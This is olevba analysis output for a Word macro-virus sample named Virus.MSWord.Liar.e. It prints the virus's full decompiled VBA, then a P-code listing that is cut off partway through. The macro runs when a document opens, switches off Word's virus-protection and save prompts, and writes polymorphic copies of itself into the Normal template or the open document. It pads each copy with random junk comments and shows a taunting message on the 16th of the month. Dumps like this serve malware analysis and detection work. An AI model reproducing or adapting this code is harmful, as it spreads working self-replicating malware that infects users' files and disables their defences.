olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Liar.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Liar.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub doCUmENT_OpEN() '¹Ò¡ŸÙ¨É¬ÿÊä²ø ØÈÉÛÿÒ¥ááÕ¿ÔóÊ®À»·žãÅ¼à¦òôý£°í�­žîÃÖ÷ÎÿÕ·«Ú
Dim V(200): Options.VirusProtection = (Rnd * 0): Options.SaveNormalPrompt = (Rnd * 0) '®ûÒ¾½þåÞÂÏî¦ã¿Øãðó£ô·Í²ª¨ìÊáËÎòãË¤®Ä°°Óêºúœ´¹ÛÝîäÙä¹þ×¸÷üïâœÅ¥
Set A = MacroContainer.VBProject: Set AB = A.VBcomPoNENTS(1) '¼ÎÊÊó±œÓ¯°þÍËëÛž¬Ùµâ¸ÐÇ®Ôº ··Ÿÿâò¼àä»®³À²åÐÌâÖñÔû¡Í¸Þ¢ñë¢ìÒèð®ž®ãý®õì
Set AbC = AB.CODEMOdULE: Set s = NormalTemplate: t = Chr(39) 'ÿÁ¶ÕÏÝÛ×ð´ú°¦÷¹îÿìá¨ÃÆ¤öñ¾°âäà£ª¤Ä»žÅ±¯² ¿Æ¹¸£äëÀñ£Æ¨ÂîôÃ¾ÅÌ°íÿÌâÕà²ì¢Úþ
If MacroContainer = s Then Set s = ActiveDocument 'ï½ôØÜ�®Äó©¨Éö¶ù±íéÄÏÌæ¶ÀÀÑÁÄœ«Ù¥ÂÂÙëøØ©Ä¼É´÷¢©²ÙæÓ»¡¦¯ž
Set NH = s.VBProject.VBcomPoNENTS(1).CODEMOdULE: li = AbC.CoUnTOFLiNes: y = 100 + Int(Rnd * 50) 'Ï»¸¹·òôÐ»¾¿¥»øÛüÁËÒ¹üé¬ÓÕÒïÄ«¦ü»¸ùÖó£òÛüò£�ÔÚîÁÃ«úßµü¡Í¬þÓ�¬ü
'Ï»¸¹·òôÐ»¾¿¥»øÛüÁËÒ¹üé¬ÓÕÒïÄ«¦ü»¸ùÖó£òÛüò£�ÔÚîÁÃ«úßµü¡Í¬þÓ�¬ü
For i = 1 To li: jc = "": D = Int(Rnd * 3): p = InStr(AbC.LinES(i, 1), t) 'Ùþü¤Ú§ì×çÍ®ÜèâÒÁùõÚüÁàåý§òà¾Ÿë×±ÃØ»É´ ßþÑ·Ííù«¹íÍÑéºû££¼ö�åàÕÎÈç
If p = 1 And li > y Then 'Ëç÷Ð¹ãÒðÇåø«ó£à·£ÏùÓúÕÔýÈÌ¼ž¥øÕ·£Ñòê­¨±¬ÊÜ¬Ëåü×íÚ»±ßÖÒù¢Ñ¥ðÀ·æ¢ùÞ
'Ëç÷Ð¹ãÒðÇåø«ó£à·£ÏùÓúÕÔýÈÌ¼ž¥øÕ·£Ñòê­¨±¬ÊÜ¬Ëåü×íÚ»±ßÖÒù¢Ñ¥ðÀ·æ¢ùÞ
D = 1: GoTo N_ '·ùÕ£Ãðòÿ£¬Ë«Áç£�ÒãÐÇäÖÁ¯¶¸¦¹îå¥žµ¼Âä±¢¨ÀËÏðí¥ÈÃ÷¶¶ä¶ó¯Àèø±Ùö×ÞÕï«
End If 'ú�Üµçï«ØïŸ¡«­è½ÚÕðœÞŸÊöÊøâ²§õèïãØø¹²¡ºâ¨ï¾­ß�ž¯¨íóÝÐ ÞÚ½³ú÷ëÚ´ÁŸ
'ú�Üµçï«ØïŸ¡«­è½ÚÕðœÞŸÊöÊøâ²§õèïãØø¹²¡ºâ¨ï¾­ß�ž¯¨íóÝÐ ÞÚ½³ú÷ëÚ´ÁŸ
L = UCase(Left(AbC.LinES(i, 1), (p - 1))) 'ùô½ùëÓ¿Í¡æÝéÆæœÃ±§Å¼è³ÉãæÕÆÞ¤å¬Öæ·ßÀ¯µÍ¿ÛÏëüýãµ©×­ÚÍîÁ¬¶ª·Þü°¾ÀìÔÄÔ
'ùô½ùëÓ¿Í¡æÝéÆæœÃ±§Å¼è³ÉãæÕÆÞ¤å¬Öæ·ßÀ¯µÍ¿ÛÏëüýãµ©×­ÚÍîÁ¬¶ª·Þü°¾ÀìÔÄÔ
For o = 1 To Len(L): F = Mid(L, o, 1) 'Ðé´üüìë§ññ³êÖ¯ÄÆœÞÏºËÞŸýÒý·ÅÈ½éü¿ÞÃœ¼¯¬¿¥±öÊÍÚÙ»å²Ñ¨Âì�ç
If Asc(F) < 90 And Asc(F) > 65 Then F = Chr(Asc(F) + Int(Rnd * 2) * 32) 'œ³±Û¿¡öíìÈ´�·Úå­ÖŸ·¤§ÊÙñªŸÛºüí¼ùåµÌè¥Â³òÐâ´ÝÇôäú£ª«è¤ÌçñõÓæœîÀº¦ø
V(i) = V(i) & F: Next o 'Ô¯ŸÁÔñåùÛ´Ó·ýö·åÏµ¨·»µÙ¥éû¡úÍáïºœ¦Ï±ªðØò¶ ¢ý¨Øá÷×©¦Ð àÏ
For J = 1 To Int(75 - (Rnd * 20)): jc = jc & Chr(255 - Int(Rnd * 100)): Next J 'òÜªù¯ðáÕ«¤ÀªÓÀô½Ëó·ŸÊÄûûÓ¸Õ¤ÿµÚðáúð�Ð¶¶Ã²¿¦´²ÈÄÊŸÀºËÔó¶ø àì¦ì¶²¦åÂõéÏÆ
'òÜªù¯ðáÕ«¤ÀªÓÀô½Ëó·ŸÊÄûûÓ¸Õ¤ÿµÚðáúð�Ð¶¶Ã²¿¦´²ÈÄÊŸÀºËÔó¶ø àì¦ì¶²¦åÂõéÏÆ
V(i) = V(i) & t & jc 'Óž¢óâ°½ÅìÔ�ïöõú¡œ£Üø±êº½ÒôÎÿÓÚáýäÑÈ�Ð©ÄÓ¹¼¤ÔóÒ¹ ÷èÂ¾Ÿ¡µ
If D = 2 Then V(i) = V(i) & vbCr & t & jc 'È½Þ°¸¡ÍÇ®¿Â¯½¼úò åíáŸ§ÀçÍ×¥ãðÔðº¾ýÜÔ½ÌÉì¹»Õ¿Þñé¢À�¶Î§¼½üÊñì¯×ä¬öñÔÐú¥Ò
VC = VC & V(i) & vbCr 'ê¾î³Ê­Æò¡åÏ¢í­ì«Éºž¿ýŸßØ¼ÍÑ áœïÂáäºõ«¢ñµéô§¡ÉÅÙ¦ÆôìÎ¦ÿéÄá£æ×Òÿºç¸îÁÒÝ
'ê¾î³Ê­Æò¡åÏ¢í­ì«Éºž¿ýŸßØ¼ÍÑ áœïÂáäºõ«¢ñµéô§¡ÉÅÙ¦ÆôìÎ¦ÿéÄá£æ×Òÿºç¸îÁÒÝ
N_: 'ø¯¥ðÒà¿Ý­Â³é±éµõ¢¿ïøÅéÿœ¶Ýç³ê´½«éç¢ü¢É¡ÒËÒ×¬ÛëÂúÔðÃ¬ûÁÕ«¬õ´§¥È¼Ðâñ­È
'ø¯¥ðÒà¿Ý­Â³é±éµõ¢¿ïøÅéÿœ¶Ýç³ê´½«éç¢ü¢É¡ÒËÒ×¬ÛëÂúÔðÃ¬ûÁÕ«¬õ´§¥È¼Ðâñ­È
Next i 'ìô®åÎÍüºõì¼¥Ú£÷õ¶èê±´çåÀÒ½»À¢ûÝÏòÞ�æœÃŸê¼÷ðüå×íïÏï¨Óª¿¢ü�­ Êò¹ÉÜõ¶ª×ç¼é ®Ê
If NH.CoUnTOFLiNes < (1 + 1 + 2) Then 'Öæç¸îÅ½×Ñ«¶žº½üŸè¼áÎªÓÙÛê²ÖÔ¶éáÞ¾©×å×äÍëöªœãÒâÜÙ­Ú­ôÌ ÚªØæ¥é¹Úº½òüóÙðÂÂÑÁÔ
NH.dELeTELInEs 1, NH.CoUnTOFLiNes: NH.AddfROmstrIng VC: NH.dELeTELInEs NH.CoUnTOFLiNes, 1 'ä¼åþØ«×¦ô°ÖÌÏç¸þî¢Åµõ£Ð´äùÙÜ®²Æýá÷ÇÇØ©äÍÂÛÊºÔž¶çÂè®Á³õÏöë
If ActiveDocument.Saved = False Then ActiveDocument.SaveAs ActiveDocument.FullName 'ëãèÊð¥èð¾Ã®¹×Ü®ï®Ÿ¿ ¢Öí£Ë×ñËÊìÊã»¹ÔËÜ¯üå³£©ÐÞ¨àÎÞ¦Ó²³ü¡±ËºÕè³Ò
If Day(Now()) = 16 Then beg_to_diffEr 'ùÍãúò½¡¥àõ©Á¡í÷ ââØå¨Þæý²æ®ÁÑüèß¼´ßÆÀýáÎËÁ£½íÛ³òüãª¼ßŸÔáÉèôúñý
End If '¸ùÚÍÚ¾ôü­ÑÒœæÏ¸ÐéÄÅÌÔåžÔ·Îï×ÙûèàÃª¾²â³ìÊøÏö�Ç´Ùû¬«Ãíäê¿°ÌË¦´¶²¿æì±¶¨¡£
End Sub 'ïíÇåóÕ­¨ØÌþíõ·¿¸Ì²¦ž©ËÌªÜ£¦òÕæÆÛèÉ´¤ÎäáßÖÜ¯«ÿàÿßÄ·ÔéÅ�â�ÒïÁ
'ïíÇåóÕ­¨ØÌþíõ·¿¸Ì²¦ž©ËÌªÜ£¦òÕæÆÛèÉ´¤ÎäáßÖÜ¯«ÿàÿßÄ·ÔéÅ�â�ÒïÁ
Private Sub beg_to_diffEr() '±Á¹ÈžéÁ ÊÌö²¿´¥¢ÇžÆæŸŸæÌÌÇ�£½íò·°ÊöúÏºëðõÝý¹½æ·Î¨ò­âÐÈôÿ­ä¦ù¹µ
bEg = "DO yOU sEE WhAT i sEE?" & vbCr 'ÊìåªªúÍ¤½¥Úâ¶è ò¶¤î¢çŸÇ×ñÉì¾ìè¨Æ¯ÈÂÔì¶Þ¬¿º²¯óÜ´ëöóÃÙÂº©ûÂœéÙÈ
bEg = bEg & "Do YoU heAR WhAT I HeAr?" & vbCr 'µæõóãáîÕûáÆäÆ»¯·ö¯Âø¡³ÏÓðÍÔÛÚôž¯ýÔÒÛ½«Î»ÀÙ¯ë¡úì÷ÓÖ®ÖîÙº¾ýÝÍÚÀÑÆîÌ
bEg = bEg & "Do yOu feel WhAt I feeL?" & vbCr 'ÒÏ§¾õØ±ãÐ±ÛËþÁ²²ò  œÓäÑàìîÆ·¡æÃôÇêÑÇÕáÍ­®¤Å÷ºÏÔüÁ¼ìúŸ¹è°Þþâ£àî
bEg = bEg & "dO YOU EVer cArE?" & vbCr 'ÁÉµ»¥õô½žôºÝ¥½ææ½î¿¿øÑØ¶ýèÉç§Â»íäñÞ¯¢­Î¤þÅÎØÑ©ý£´ÈÍúªö¼ÖÙ§Ùãô¡¼
bEg = bEg & "I...Beg tO DiFFer!" & vbCr 'ÈÇªœ¶Óêð¯¨äëïÐ»Ê´êïãíõëâþæýêÛð²¥·óÿúýðàóÿ§ÙÔ´«ôÅÊúõ÷¥½Ûé�ôèäöæÀ®
bEg = bEg & "Beg TO DIFFER!" & vbCr & vbCr '¡èòú¾ëîß£Ø¬£ÁÿüÙçÔêµ»·¶èÚÖÄõÃÐÓ¯øÃ¼Ù·±ÿ÷«�úáÜíÙ¾Ò¹ºÕÜÀêïÒ¾ÏÂ
'¡èòú¾ëîß£Ø¬£ÁÿüÙçÔêµ»·¶èÚÖÄõÃÐÓ¯øÃ¼Ù·±ÿ÷«�úáÜíÙ¾Ò¹ºÕÜÀêïÒ¾ÏÂ
bEg = bEg & "jACk twoFLOWEr/lZ0/MeTA" 'žŸºÜ ª´êÉ¤Ø÷®»ÈÒÚì»áØ´Ó¡¢¡½êÅ¨Êªì¶øõúÊ­»òô°­¶Óº³å÷ÜàÞÿÔ³ö
MsgBox bEg, 0, "cLASs.BeG To diFfEr" 'ÃÊ­ÀÙö´ÝýøäÃú³ðØÁÏ Ü¨¾ž¡ÑøÖ­ÒÙ©ÊÜ§üàÓÌÁàÙñÂ¢þø½ÎÕ¯«óßûÇ¨Æÿ°ñùªËà¶ÆÓÂ¡
End Sub 'ñ§ü¥ýÕøû÷ýé£½¤¥òÏãÉéËÎï¨äØæÑïþ®­åÕ¼çä§öµ½åÃÃíÂüôÉò§ÆÚå¦ÄÖöªÃ
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Liar.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10137 bytes
' Line #0:
' 	FuncDefn (Private Sub doCUmENT_OpEN())
' 	QuoteRem 0x001C 0x0039 "¹Ò¡ŸÙ¨É¬ÿÊä²ø ØÈÉÛÿÒ¥ááÕ¿ÔóÊ®À»·žãÅ¼à¦òôý£°í�­žîÃÖ÷ÎÿÕ·«Ú"
' Line #1:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00C8 
' 	VarDefn V
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	QuoteRem 0x0056 0x003E "®ûÒ¾½þåÞÂÏî¦ã¿Øãðó£ô·Í²ª¨ìÊáËÎòãË¤®Ä°°Óêºúœ´¹ÛÝîäÙä¹þ×¸÷üïâœÅ¥"
' Line #2:
' 	SetStmt 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	Set A 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld A 
' 	ArgsMemLd VBcomPoNENTS 0x0001 
' 	Set AB 
' 	QuoteRem 0x003D 0x0045 "¼ÎÊÊó±œÓ¯°þÍËëÛž¬Ùµâ¸ÐÇ®Ôº ··Ÿÿâò¼àä»®³À²åÐÌâÖñÔû¡Í¸Þ¢ñë¢ìÒèð®ž®ãý®õì"
' Line #3:
' 	SetStmt 
' 	Ld AB 
' 	MemLd CODEMOdULE 
' 	Set AbC 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set s 
' 	BoS 0x0000 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	St t 
' 	QuoteRem 0x003D 0x0048 "ÿÁ¶ÕÏÝÛ×ð´ú°¦÷¹îÿìá¨ÃÆ¤öñ¾°âäà£ª¤Ä»žÅ±¯² ¿Æ¹¸£äëÀñ£Æ¨ÂîôÃ¾ÅÌ°íÿÌâÕà²ì¢Úþ"
' Line #4:
' 	Ld MacroContainer 
' 	Ld s 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set s 
' 	EndIf 
' 	QuoteRem 0x0032 0x0037 "ï½ôØÜ�®Äó©¨Éö¶ù±íéÄÏÌæ¶ÀÀÑÁÄœ«Ù¥ÂÂÙëøØ©Ä¼É´÷¢©²ÙæÓ»¡¦¯ž"
' Line #5:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld s 
' 	MemLd VBProject 
' 	ArgsMemLd VBcomPoNENTS 0x0001 
' 	MemLd CODEMOdULE 
' 	Set NH 
' 	BoS 0x0000 
' 	Ld AbC 
' 	MemLd CoUnTOFLiNes 
' 	St li 
' 	BoS 0x0000 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Add 
' 	St y 
' 	QuoteRem 0x0060 0x003D "Ï»¸¹·òôÐ»¾¿¥»øÛüÁËÒ¹üé¬ÓÕÒïÄ«¦ü»¸ùÖó£òÛüò£�ÔÚîÁÃ«úßµü¡Í¬þÓ�¬ü"
' Line #6:
' 	QuoteRem 0x0000 0x003D "Ï»¸¹·òôÐ»¾¿¥»øÛüÁËÒ¹üé¬ÓÕÒïÄ«¦ü»¸ùÖó£òÛüò£�ÔÚîÁÃ«úßµü¡Í¬þÓ�¬ü"
' Line #7:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld li 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St jc 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	St D 
' 	BoS 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AbC 
' 	ArgsMemLd LinES 0x0002 
' 	Ld t 
' 	FnInStr 
' 	St p 
' 	QuoteRem 0x004A 0x0040 "Ùþü¤Ú§ì×çÍ®ÜèâÒÁùõÚüÁàåý§òà¾Ÿë×±ÃØ»É´ ßþÑ·Ííù«¹íÍÑéºû££¼ö�åàÕÎÈç"
' Line #8:
' 	Ld p 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld li 
' 	Ld y 
' 	Gt 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0019 0x0041 "Ëç÷Ð¹ãÒðÇåø«ó£à·£ÏùÓúÕÔýÈÌ¼ž¥øÕ·£Ñòê­¨±¬ÊÜ¬Ëåü×íÚ»±ßÖÒù¢Ñ¥ðÀ·æ¢ùÞ"
' Line #9:
' 	QuoteRem 0x0000 0x0041 "Ëç÷Ð¹ãÒðÇåø«ó£à·£ÏùÓúÕÔýÈÌ¼ž¥øÕ·£Ñòê­¨±¬ÊÜ¬Ëåü×íÚ»±ßÖÒù¢Ñ¥ðÀ·æ¢ùÞ"
' Line #10:
' 	LitDI2 0x0001 
' 	St D 
' 	BoS 0x0000 
' 	GoTo N_ 
' 	QuoteRem 0x000F 0x0041 "·ùÕ£Ãðòÿ£¬Ë«Áç£�ÒãÐÇäÖÁ¯¶¸¦¹îå¥žµ¼Âä±¢¨ÀËÏðí¥ÈÃ÷¶¶ä¶ó¯Àèø±Ùö×ÞÕï«"
' Line #11:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0040 "ú�Üµçï«ØïŸ¡«­è½ÚÕðœÞŸÊöÊøâ²§õèïãØø¹²¡ºâ¨ï¾­ß�ž¯¨íóÝÐ ÞÚ½³ú÷ëÚ´ÁŸ"
' Line #12:
' 	QuoteRem 0x0000 0x0040 "ú�Üµçï«ØïŸ¡«­è½ÚÕðœÞŸÊöÊøâ²§õèïãØø¹²¡ºâ¨ï¾­ß�ž¯¨íóÝÐ ÞÚ½³ú÷ëÚ´ÁŸ"
' Line #13:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AbC 
' 	ArgsMemLd LinES 0x0002 
' 	Ld p 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St L 
' 	QuoteRem 0x002A 0x0043 "ùô½ùëÓ¿Í¡æÝéÆæœÃ±§Å¼è³ÉãæÕÆÞ¤å¬Öæ·ßÀ¯µÍ¿ÛÏëüýãµ©×­ÚÍîÁ¬¶ª·Þü°¾ÀìÔÄÔ"
' Line #14:
' 	QuoteRem 0x0000 0x0043 "ùô½ùëÓ¿Í¡æÝéÆæœÃ±§Å¼è³ÉãæÕÆÞ¤å¬Öæ·ßÀ¯µÍ¿ÛÏëüýãµ©×­ÚÍîÁ¬¶ª·Þü°¾ÀìÔÄÔ"
' Line #15:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld L 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld L 
' 	Ld o 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St False 
' 	QuoteRem 0x0026 0x0038 "Ðé´üüìë§ññ³êÖ¯ÄÆœÞÏºËÞŸýÒý·ÅÈ½éü¿ÞÃœ¼¯¬¿¥±öÊÍÚÙ»å²Ñ¨Âì�ç"
' Line #16:
' 	Ld False 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x005A 
' 	Lt 
' 	Ld False 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0041 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld False 
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0020 
' 	Mul 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St False 
' 	EndIf 
' 	QuoteRem 0x0048 0x0041 "œ³±Û¿¡öíìÈ´�·Úå­ÖŸ·¤§ÊÙñªŸÛºüí¼ùåµÌè¥Â³òÐâ´ÝÇôäú£ª«è¤ÌçñõÓæœîÀº¦ø"
' Line #17:
' 	Ld i 
' 	ArgsLd V 0x0001 
' 	Ld False 
' 	Concat 
' 	Ld i 
' 	ArgsSt V 0x0001 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0018 0x0037 "Ô¯ŸÁÔñåùÛ´Ó·ýö·åÏµ¨·»µÙ¥éû¡úÍáïºœ¦Ï±ªðØò¶ ¢ý¨Øá÷×©¦Ð àÏ"
' Line #18:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Paren 
' 	Sub 
' 	FnInt 
' 	For 
' 	BoS 0x0000 
' 	Ld jc 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St jc 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x004F 0x0046 "òÜªù¯ðáÕ«¤ÀªÓÀô½Ëó·ŸÊÄûûÓ¸Õ¤ÿµÚðáúð�Ð¶¶Ã²¿¦´²ÈÄÊŸÀºËÔó¶ø àì¦ì¶²¦åÂõéÏÆ"
' Line #19:
' 	QuoteRem 0x0000 0x0046 "òÜªù¯ðáÕ«¤ÀªÓÀô½Ëó·ŸÊÄûûÓ¸Õ¤ÿµÚðáúð�Ð¶¶Ã²¿¦´²ÈÄÊŸÀºËÔó¶ø àì¦ì¶²¦åÂõéÏÆ"
' Line #20:
' 	Ld i 
' 	ArgsLd V 0x0001 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt V 0x0001 
' 	QuoteRem 0x0015 0x0037 "Óž¢óâ°½ÅìÔ�ïöõú¡œ£Üø±êº½ÒôÎÿÓÚáýäÑÈ�Ð©ÄÓ¹¼¤ÔóÒ¹ ÷èÂ¾Ÿ¡µ"
' Line #21:
' 	Ld D 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	ArgsLd V 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	Ld t 
' 	Concat 
' 	Ld jc 
' 	Concat 
' 	Ld i 
' 	ArgsSt V 0x0001 
' 	EndIf 
' 	QuoteRem 0x002A 0x0046 "È½Þ°¸¡ÍÇ®¿Â¯½¼úò åíáŸ§ÀçÍ×¥ãðÔðº¾ýÜÔ½ÌÉì¹»Õ¿Þñé¢À�¶Î§¼½üÊñì¯×ä¬öñÔÐú¥Ò"
' Line #22:
' 	Ld VC 
' 	Ld i 
' 	ArgsLd V 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VC 
' 	QuoteRem 0x0016 0x0045 "ê¾î³Ê­Æò¡åÏ¢í­ì«Éºž¿ýŸßØ¼ÍÑ áœïÂáäºõ«¢ñµéô§¡ÉÅÙ¦ÆôìÎ¦ÿéÄá£æ×Òÿºç¸îÁÒÝ"
' Line #23:
' 	QuoteRem 0x0000 0x0045 "ê¾î³Ê­Æò¡åÏ¢í­ì«Éºž¿ýŸßØ¼ÍÑ áœïÂáäºõ«¢ñµéô§¡ÉÅÙ¦ÆôìÎ¦ÿéÄá£æ×Òÿºç¸îÁÒÝ"
' Line #24:
' 	Label N_ 
' 	QuoteRem 0x0004 0x0044 "ø¯¥ðÒà¿Ý­Â³é±éµõ¢¿ïøÅéÿœ¶Ýç³ê´½«éç¢ü¢É¡ÒËÒ×¬ÛëÂúÔðÃ¬ûÁÕ«¬õ´§¥È¼Ðâñ­È"
' Line #25:
' 	QuoteRem 0x0000 0x0044 "ø¯¥ðÒà¿Ý­Â³é±éµõ¢¿ïøÅéÿœ¶Ýç³ê´½«éç¢ü¢É¡ÒËÒ×¬ÛëÂúÔðÃ¬ûÁÕ«¬õ´§¥È¼Ðâñ­È"
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x004A "ìô®åÎÍüºõì¼¥Ú£÷õ¶èê±´çåÀÒ½»À¢ûÝÏòÞ�æœÃŸê¼÷ðüå×íïÏï¨Óª¿¢ü�­ Êò¹ÉÜõ¶ª×ç¼é ®Ê"
' Line #27:
' 	Ld NH 
' 	MemLd CoUnTOFLiNes 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	Add 
' 	Paren 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x0026 0x004A "Öæç¸îÅ½×Ñ«¶žº½üŸè¼áÎªÓÙÛê²ÖÔ¶éáÞ¾©×å×äÍëöªœãÒâÜÙ­Ú­ôÌ ÚªØæ¥é¹Úº½òüóÙðÂÂÑÁÔ"
' Line #28:
' 	LitDI2 0x0001 
' 	Ld NH 
' 	MemLd CoUnTOFLiNes 
' 	Ld NH 
' 	ArgsMemCall dELeTELInEs 0x0002 
' 	BoS 0x0000 
' 	Ld VC 
' 	Ld NH 
' 	ArgsMemCall AddfROmstrIng 0x0001 
' 	BoS 0x0000 
' 	Ld NH 
' 	MemLd CoUnTOFLiNes 
' 	LitDI2 0x0001 
' 	Ld NH 
' 	ArgsMemCall dELeTELInEs 0x0002 
' 	QuoteRem 0x005A 0x0039 "ä¼åþØ«×¦ô°ÖÌÏç¸þî¢Åµõ£Ð´äùÙÜ®²Æýá÷ÇÇØ©äÍÂÛÊºÔž¶çÂè®Á³õÏöë"
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' 	QuoteRem 0x0053 0x003E "ëãèÊð¥èð¾Ã®¹×Ü®ï®Ÿ¿ ¢Öí£Ë×ñËÊìÊã»¹ÔËÜ¯üå³£©ÐÞ¨àÎÞ¦Ó²³ü¡±ËºÕè³Ò"
' Line #30:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall beg_to_diffEr 0x0000 
' 	EndIf 
' 	QuoteRem 0x0026 0x003E "ùÍãúò½¡¥àõ©Á¡í÷ ââØå¨Þæý²æ®ÁÑüèß¼´ßÆÀýáÎËÁ£½íÛ³òüãª¼ßŸÔáÉèôúñý"
' Line #31:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0046 "¸ùÚÍÚ¾ôü­ÑÒœæÏ¸ÐéÄÅÌÔåžÔ·Îï×ÙûèàÃª¾²â³ìÊøÏö�Ç´Ùû¬«Ãíäê¿°ÌË¦´¶²¿æì±¶¨¡£"
' Line #32:
' 	EndSub 
' 	QuoteRem 0x0008 0x003B "ïíÇåóÕ­¨ØÌþíõ·¿¸Ì²¦ž©ËÌªÜ£¦òÕæÆÛèÉ´¤ÎäáßÖÜ¯«ÿàÿßÄ·ÔéÅ�â�ÒïÁ"
' Line #33:
' 	QuoteRem 0x0000 0x003B "ïíÇåóÕ­¨ØÌþíõ·¿¸Ì²¦ž©ËÌªÜ£¦òÕæÆÛèÉ´¤ÎäáßÖÜ¯«ÿàÿßÄ·ÔéÅ�â�ÒïÁ"
' Line #34:
' 	FuncDefn (Private Sub beg_to_diffEr())
' 	QuoteRem 0x001C 0x003E "±Á¹ÈžéÁ ÊÌö²¿´¥¢ÇžÆæŸŸæÌÌÇ�£½íò·°ÊöúÏºëðõÝý¹½æ·Î¨ò­âÐÈôÿ­ä¦ù¹µ"
' Line #35:
' 	LitStr 0x0016 "DO yOU sEE WhAT i sEE?"
' 	Ld vbCr 
' 	Concat 
' 	St bEg 
' 	QuoteRem 0x0026 0x003D "ÊìåªªúÍ¤½¥Úâ¶è ò¶¤î¢çŸÇ×ñÉì¾ìè¨Æ¯ÈÂÔì¶Þ¬¿º²¯óÜ´ëöóÃÙÂº©ûÂœéÙÈ"
' Line #36:
' 	Ld bEg 
' 	LitStr 0x0018 "Do YoU heAR WhAT I HeAr?"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St bEg 
' 	QuoteRem 0x002E 0x0041 "µæõóãáîÕûáÆäÆ»¯·ö¯Âø¡³ÏÓðÍÔÛÚôž¯ýÔÒÛ½«Î»ÀÙ¯ë¡úì÷ÓÖ®ÖîÙº¾ýÝÍÚÀÑÆîÌ"
' Line #37:
' 	Ld bEg 
' 	LitStr 0x0018 "Do yOu feel WhAt I feeL?"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St bEg 
' 	QuoteRem 0x002E 0x003E "ÒÏ§¾õØ±ãÐ±ÛËþÁ²²ò  œÓäÑàìîÆ·¡æÃôÇêÑÇÕáÍ­®¤Å÷ºÏÔüÁ¼ìúŸ¹è°Þþâ£àî"
' Line #38:
' 	Ld bEg 
' 	LitStr 0x0011 "dO YOU EVer cArE?"
' 	Concat 
' 	Ld vbCr 
